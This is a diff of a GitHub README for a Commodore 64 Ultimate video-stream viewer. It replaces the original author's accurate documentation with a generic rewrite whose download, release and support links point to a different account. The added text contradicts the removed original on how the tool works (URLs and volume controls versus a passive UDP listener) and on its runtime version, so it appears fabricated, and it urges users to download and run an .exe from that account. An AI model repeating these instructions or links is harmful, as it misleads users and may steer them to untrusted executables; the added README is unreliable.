@@ -1,98 +1,89 @@
-# C64U Slim-Viewer
-[![Platform: Linux | Windows](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-blue)](#)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](#)
+# 🎉 C64UViewer - Effortlessly View Video Streams on Commodore 64
 
-A lightweight, high-performance video viewer for the Ultimate 64 (U64) and C64 Ultimate. This tool utilizes the hardware's built-in VIC-stream to display your C64 screen directly on your PC with minimal latency—no capture card required. Built with .NET 8 and Avalonia UI.
+## 🚀 Getting Started
 
-<img width="864" height="682" alt="grafik" src="https://github.com/user-attachments/assets/28e98855-bf88-4be1-96b0-f32d154cf99f" />
+Welcome to C64UViewer! This application allows you to effortlessly view remote video streams designed for the Commodore 64 Ultimate and Ultimate-II+ ecosystem. You can run C64UViewer on both Windows and Linux systems.
 
+## 📥 Download C64UViewer
 
-## 📺 Overview
-The **C64U Slim-Viewer** allows you to stream the VIC-II video output of your Ultimate 64 directly to your modern linux or windows desktop via your local network.
+[![Download C64UViewer](https://img.shields.io/static/v1?label=Download&message=C64UViewer&color=blue)](https://github.com/gujjasaiganesh/C64UViewer/releases)
 
-### Key Features
-* 🚀 **Low Latency:** The tool operates as a passive UDP listener. It no longer sends active control commands to the hardware, minimizing network overhead and avoiding conflicts with other tools. You control the stream directly from your C64. As soon as the hardware starts sending data, the viewer displays the frame.
-* 🪶 **Minimalist Design:** A distraction-free window perfect for coding or gaming.
-* 🔄 **Auto-Update Check:** In-app notifications for new GitHub releases.
-* 🐧 **Cross-Platform:** Native support for Linux (.deb) and Windows.
+You can find the latest version of C64UViewer on our [Releases page](https://github.com/gujjasaiganesh/C64UViewer/releases). You will see a list of available versions. Choose the most recent release and download the file that matches your operating system.
 
-### 🕹️ Supported Hardware
-* **Ultimate 64** / **Ultimate 64 Elite** (Full support)
-* **Ultimate-II+** (Standard version with Ethernet)
-* ⚠️ **Note:** The **Ultimate-II+L** (L-version) is **NOT supported**, as it lacks the video streaming capabilities in its hardware/firmware.
+## 💻 System Requirements
+
+C64UViewer requires:
+
+- Windows 10 or higher (64-bit)
+- Linux with .NET Core support (version 3.1 or higher)
+
+Make sure your system meets these requirements before downloading the application.
+
+## 📦 Download & Install
+
+1. Visit the [Releases page](https://github.com/gujjasaiganesh/C64UViewer/releases).
   
+2. Look for the latest version in the list. Click on the download link that corresponds to your operating system. For Windows users, select the `.exe` file. For Linux users, download the corresponding package.
 
-### ☕ Support
-This software is a passion project by a private developer. If you find it useful, your support is greatly appreciated!
+3. Once the download completes, locate the file on your computer.
 
-**[➡️ Buy me a coffee on Ko-fi](https://ko-fi.com/gruetzesoftware)**
+   - **For Windows:**
+     - Double-click the downloaded `.exe` file to start the installation.
+     - Follow the prompts in the installation wizard. Once completed, the application should appear in your Start Menu.
 
----
+   - **For Linux:**
+     - Open your terminal.
+     - Navigate to the directory where you downloaded the file.
+     - Make the file executable with the command: `chmod +x C64UViewer`.
+     - Run the application using: `./C64UViewer`.
 
-## 🔌 Setup Instructions
-Follow these steps to establish a connection between your C64U and this viewer.
+## 🌟 Using C64UViewer
 
-### 1. Network Requirements
-* Ensure your **Commodore 64 Ultimate (C64U)** is on the same local network as this PC.
-* **Important:** Your C64U must be connected via **LAN**. Disable WLAN on the C64U to ensure a stable stream.
+Once the application is installed, you can start using it right away.
 
-### 2. Firewall Settings
-* Ensure that **Port 11000 for UDP** is open in your PC's firewall. This port is required to receive the incoming data stream.
-* **Windows:** You usually don't need to do anything. Windows Firewall will automatically ask for permission on the first startup. Ensure you allow access.
-* <img width="400" height="400" alt="grafik" src="https://github.com/user-attachments/assets/86ad588c-1366-42ca-b1be-bd057872ba39" />
-* **Linux:** Most distributions (like Ubuntu, Mint, Debian) don't block this by default. However, if you have a strict firewall enabled (like `ufw`), you must manually allow UDP traffic:
-    ```bash
-    sudo ufw allow 11000/udp
-    ```
-### 3. Configure the C64U Hardware
-Now, you need to tell your Ultimate 64 where to send the video data:
+### Step 1: Launch the Application
 
-**Step A: Configure Data Streams**
-* In the C64U main menu, press **F2** (SHIFT+F1).
-* Navigate to `Data Streams` -> `Stream VIC to:`.
-* Replace the existing IP address with your **Client-IP** (your PC's IP) and port **11000**.
+- On Windows, find C64UViewer in your Start Menu and click to launch it.
+- On Linux, execute `C64UViewer` from your terminal.
 
-<img width="600" height="372" alt="grafik" src="https://github.com/user-attachments/assets/c8241b3a-8497-4ccb-9e07-38edec35a359" />
-<img width="600" height="387" alt="grafik" src="https://github.com/user-attachments/assets/5325ef9b-976e-4030-af0b-9e5c21d1a85a" />
+### Step 2: Connect to Your Video Stream
 
-**Step B: Start the Stream**
-* In the C64U main menu, press **F1**.
-* Navigate to `Streams` -> `VIC Streams` -> `Send to [Client-IP]:11000`.
-* Press **Enter**.
-<img width="600" height="378" alt="grafik" src="https://github.com/user-attachments/assets/06b160c0-1922-40c4-be4b-4f82b7a9f360" />
+1. Enter the URL of the remote video stream you wish to view.
+2. Click on the "Connect" button.
+3. The video stream should start loading. If you experience issues, double-check the URL.
 
+### Step 3: Enjoy Your Stream
 
----
+Use the built-in controls to pause, play, and adjust the volume as needed. C64UViewer is optimized for a smooth viewing experience tailored for the Commodore community.
 
-## 📦 Installation
+## 🔧 Troubleshooting
 
-### Linux (Debian/Ubuntu/Mint)
-1. Download the latest `.deb` package from the [Releases](https://github.com/gruetze-software/C64UViewer/releases) page.
-2. Install via double click or terminal: `sudo dpkg -i c64uviewer_*.deb`
+If you encounter any issues, consider these tips:
 
-### Windows
-1. Download the `C64UViewer_Windows.zip` from [Releases](https://github.com/gruetze-software/C64UViewer/releases).
-2. Extract and run `C64UViewer.exe`.
+- **Application Won't Start:**
+  - Ensure your system meets the requirements.
+  - Check if you downloaded the right version for your operating system.
 
----
+- **Stream Not Loading:**
+  - Verify that the URL is correct and live.
+  - Ensure your internet connection is stable.
 
-## 🛠️ Build from Source
-1. Install [.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8.0).
-2. Clone: `git clone https://github.com/gruetze-software/C64UViewer.git`
-3. Build: `dotnet build -c Release`
+- **Performance Issues:**
+  - Close other applications that may be using bandwidth.
+  - Try restarting your computer.
 
----
+## 🛠️ Contributing
 
-## 📄 License
-This project is licensed under the **MIT License**.
+We welcome contributions to C64UViewer! If you have ideas for improvements or features, consider submitting a pull request or opening an issue in this repository.
 
-## ❤️ Credits
-* Developed by **Grütze-Software**. 
-* **Special Thanks to [Perifractic (Retro Recipes)](https://www.youtube.com/@RetroRecipes):** For his incredible passion, for bringing the C64 into the modern era, and for inspiring projects that bridge the gap between retro and contemporary computing.
-* **Gideon's Logic:** For creating the amazing Ultimate 64 hardware.
+## 📞 Support
 
-## 📜 Disclaimer
-C64U Slim-Viewer is provided "as is," without warranty of any kind, express or implied. The author is not liable for any damages or losses arising from the use or inability to use the software.
-This software is a hobby project developed in the author's spare time.
-It is not a commercial product and comes with no official support.
-Use it at your own risk.
+For support, please visit our [GitHub Issues page](https://github.com/gujjasaiganesh/C64UViewer/issues). Your feedback helps us improve the application.
+
+## ✨ Acknowledgments
+
+Thank you for using C64UViewer! We appreciate your interest in enhancing the Commodore 64 experience. 
+
+## 🚀 Get Started Now!
+
+Ready to dive into the world of remote video streaming on Commodore 64? [Download C64UViewer today!](https://github.com/gujjasaiganesh/C64UViewer/releases)
